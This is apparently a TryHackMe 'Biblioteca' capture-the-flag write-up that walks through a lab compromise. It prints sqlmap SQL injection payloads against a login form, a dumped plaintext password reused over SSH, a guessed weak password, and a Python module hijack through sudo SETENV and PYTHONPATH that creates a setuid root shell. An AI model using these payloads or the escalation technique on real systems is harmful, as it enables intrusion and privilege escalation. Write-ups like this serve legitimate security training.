| Category          | Details                                             |
|-------------------|-----------------------------------------------------|
| 📝 **Name**       | [Biblioteca](https://tryhackme.com/room/biblioteca) |  
| 🏷 **Type**       | THM Challenge                                       |
| 🖥 **OS**         | Linux                                               |
| 🎯 **Difficulty** | Medium                                              |
| 📁 **Tags**       | SQLi, weak password, Python module hijacking        |

## Task 1: What is the user and root flag?

### What is the user flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 10:37 +0100
Nmap scan report for 10.81.151.38
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d2:e6:d6:e2:b6:86:4f:f6:ab:9c:77:37:89:20:3a:51 (RSA)
|   256 c9:64:ac:90:26:3d:a0:81:cd:7e:9b:af:21:e1:96:d6 (ECDSA)
|_  256 a8:c2:10:ff:62:c0:44:e5:6b:6c:a6:75:d8:be:2c:9e (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.80 seconds
```

#### Discover SQLi in `username` POST param of `/login` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ sqlmap -r login.http --level 5 --batch                       
<SNIP>
[10:41:18] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:41:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:41:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:41:18] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:41:19] [INFO] target URL appears to have 4 columns in query
[10:41:19] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=john.doe' AND 4397=4397-- eIxS&password=pass

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=john.doe' AND (SELECT 7545 FROM (SELECT(SLEEP(5)))ANta)-- SfUz&password=pass

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=-9551' UNION ALL SELECT NULL,CONCAT(0x7170716b71,0x525978566850414948574e4e45796f6e6571585858616b416545564d4a6c6f715948694f58766962,0x71766b6b71),NULL,NULL-- -&password=pass
---
<SNIP>
```

#### List all databases
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ sqlmap -r login.http --level 5 --batch --dbs
<SNIP>
[10:43:18] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] performance_schema
[*] website
<SNIP>
```

#### List all tables in `website` database
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ sqlmap -r login.http --level 5 --batch -D website --tables
<SNIP>
[10:44:08] [INFO] fetching tables for database: 'website'
Database: website
[1 table]
+-------+
| users |
+-------+
<SNIP>
```

#### Dump `users` table
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ sqlmap -r login.http --level 5 --batch -D website -T users --dump
<SNIP>
[10:44:37] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[2 entries]
+----+---------------------+----------------+----------+
| id | email               | password       | username |
+----+---------------------+----------------+----------+
| 1  | smokey@email.boop   | My_P@ssW0rd123 | smokey   |
+----+---------------------+----------------+----------+
<SNIP>
```

#### Reuse discovered `smokey:My_P@ssW0rd123` credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Biblioteca]
└─$ ssh smokey@$TARGET
<SNIP>
smokey@ip-10-82-133-208:~$ id
uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
```

#### List all users with shell access
```
smokey@ip-10-82-133-208:~$ cat /etc/passwd | grep -E '/bash|/sh'
root:x:0:0:root:/root:/bin/bash
smokey:x:1000:1000:smokey:/home/smokey:/bin/bash
hazel:x:1001:1001::/home/hazel:/bin/bash
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

#### Use guessed `hazel:hazel` credentials
There is a 'Weak password' hint in the challenge.
```
smokey@ip-10-82-133-208:~$ su hazel
Password: 
hazel@ip-10-82-133-208:/home/smokey$ id
uid=1001(hazel) gid=1001(hazel) groups=1001(hazel)
```

#### Capture user flag
```
hazel@ip-10-82-133-208:~$ cat /home/hazel/user.txt 
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
```

### What is the root flag?

#### List allowed sudo commands
```
hazel@ip-10-82-133-208:~$ sudo -l
Matching Defaults entries for hazel on ip-10-82-133-208:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-82-133-208:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```
With `SETENV` configuration we control environment variables when `hasher.py` is run. Meaning we could set `PYTHONPATH` to hijack any Python modules used by this script. 

#### Analyze `/home/hazel/hasher.py`
```
hazel@ip-10-82-133-208:~$ cat -n hasher.py 
     1  import hashlib
     2
     3  def hashing(passw):
     4
     5      md5 = hashlib.md5(passw.encode())
     6
     7      print("Your MD5 hash is: ", end ="")
     8      print(md5.hexdigest())
     9
    10      sha256 = hashlib.sha256(passw.encode())
    11
    12      print("Your SHA256 hash is: ", end ="")
    13      print(sha256.hexdigest())
    14
    15      sha1 = hashlib.sha1(passw.encode())
    16
    17      print("Your SHA1 hash is: ", end ="")
    18      print(sha1.hexdigest())
    19
    20
    21  def main():
    22      passw = input("Enter a password to hash: ")
    23      hashing(passw)
    24
    25  if __name__ == "__main__":
    26      main()
```
We can see that `hashlib` module is loaded, we will hijack it to spawn root shell.

#### Hijack `hashlib` to spawn root shell
```
hazel@ip-10-81-151-38:~$ \
{ cat <<'EOF'> /tmp/hashlib.py
import os
def md5(*args, **kwargs):
    os.system("/bin/cp /bin/bash /tmp/root_shell; /bin/chmod +s /tmp/root_shell")
    exit
EOF
} && echo "escalation" | sudo -E PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py > /dev/null 2>&1; sleep 1 && \
/tmp/root_shell -p
root_shell-5.0# id
uid=1001(hazel) gid=1001(hazel) euid=0(root) egid=0(root) groups=0(root),1001(hazel)
```

#### Capture root flag
```
root_shell-5.0# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}
```
